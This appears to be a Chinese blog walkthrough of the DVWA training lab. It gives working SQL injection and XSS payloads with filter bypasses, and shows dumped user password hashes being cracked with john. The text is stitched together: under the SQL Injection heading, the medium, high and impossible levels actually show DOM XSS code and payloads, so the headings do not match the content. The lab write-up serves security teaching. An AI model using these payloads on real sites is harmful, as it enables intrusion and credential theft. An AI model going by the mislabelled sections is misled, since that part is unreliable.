---
title: DVWA SQL Injection
date: 2020-12-23 11:01:48
categories: dvwa
tags: 
- sql
---

## SQL Injection

### low 级别

**source**

```php
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```

<!-- more -->

通过 union 合并查询语句, 获取用户名和密码信息

```sql
' union select user,password from users-- 
```

![sql-injection-low1](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/dvwa/sql-injection-low1.jpg)

将获取到的信息按照用 `用户名:加密后密码` 的格式排列, 另存为 dvwa-users.txt

```txt
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99
```

在 kali 中使用 john 命令破解密码

```
(root@kali)-[~]# john --format=raw-MD5 dvwa-users.txt
```

在 kali 当前用户家目录中生成隐藏目录 .john, 其中 john.pot 中包含了解密后的密码, 使用 --show 参数可以直接查看

```shell
(root@kali)-[~]# john --format=raw-MD5 dvwa-users.txt --show
admin:password
gordonb:abc123
1337:charley
pablo:letmein
smithy:password

5 password hashes cracked, 0 left
```

### medium 级别

过滤掉了 script 标签, 但可以使用 img 标签

**source**

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?>
```

```
http://192.168.3.38/vulnerabilities/xss_d/?default=English</select><img src=1 onerror=alert('xss')>
```

![xss-dom-medium](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/dvwa/xss-dom-medium.jpg)

### high 级别

设置了白名单, 只允许使用特定关键字, 但使用 `#` 之后的内容被识别为注释, 仍然可以执行

**source**

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}

?>
```

```
http://192.168.3.38/vulnerabilities/xss_d/?default=German#<script>alert('xss')</script>
```

![xss-dom-high](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/dvwa/xss-dom-high.jpg)

### impossible 级别

开启了客户端保护

```php
<?php

# Don't need to do anything, protction handled on the client side

?>
```

## XSS (Reflected)

### low 级别

**source**

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```

```
http://192.168.3.38/vulnerabilities/xss_r/?name=<script>alert('xss')</script>#
```

### medium 级别

**source**

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

将 `<script>` 替换为空, 可以使用 `<scr<script>ipt>` 绕过

```
http://192.168.3.38/vulnerabilities/xss_r/?name=<scr<script>ipt>alert('xss')</script>#
```

### high 级别

**source**

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

过滤掉了 `<script` 关键字, 但 <img> 标签仍然可用

```
http://192.168.3.38/vulnerabilities/xss_r/?name=<img src=1 onerror=alert('xss')>#
```

### impossible 级别

**source**

```php
<?php

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $name = htmlspecialchars( $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

使用 [`htmlspecialchars`](https://www.php.net/htmlspecialchars) 对特殊字符转义, 无法使用 html 标签

